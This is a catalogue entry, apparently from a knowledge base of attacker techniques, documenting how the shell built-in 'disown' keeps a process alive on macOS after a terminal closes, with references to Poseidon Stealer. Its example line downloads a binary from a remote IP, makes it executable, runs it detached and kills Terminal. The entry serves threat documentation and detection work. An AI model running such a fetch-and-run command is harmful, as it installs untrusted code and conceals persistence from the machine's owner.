---
trust_level: community
id: macos-persistence-disown
namespace: macos:persistence:disown
name: disown
description: Prevents a process from being terminated when a shell session or terminal is closed.
author: Gabriel De Jesus (0xv1n)
version: "1.0.0"
capabilities:
  - security.persistence.hook
platforms:
  - macos
techniques:
  - persistence
execution:
  template: "disown"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
examples:
  - description: "Start a process and remove it from the jobs table.: The following command downloads a remote binary, sets it to executable, executes the binary, disowns it from the shell it spawned from, and closes the terminal session."
    command: "curl -O http://1.1.1.1/updated && chmod +x updated && ./updated & disown && pkill Terminal"
install:
  - method: custom
    commands:
      - "shell built-in command (bash)"
detections:
  - type: other
    description: "No detection content at time of writing"
references:
  - label: "disown man page"
    url: "https://linux.die.net/man/1/disown"
  - label: "bash man page"
    url: "https://man7.org/linux/man-pages/man1/bash.1.html"
  - label: "Poseidon Stealer"
    url: "https://www.esentire.com/blog/poseidon-stealer-uses-sora-ai-lure-to-infect-macos"
---

disown is a system utility that can be utilized to persist a shell process after a terminal has been closed or a shell session has been terminated. This is accomplished by preventing a SIGHUP from being sent to the running job, and removing the process from the shell jobs table. Unlike nohup which is used during process initialization, disown can be used to modify an existing process.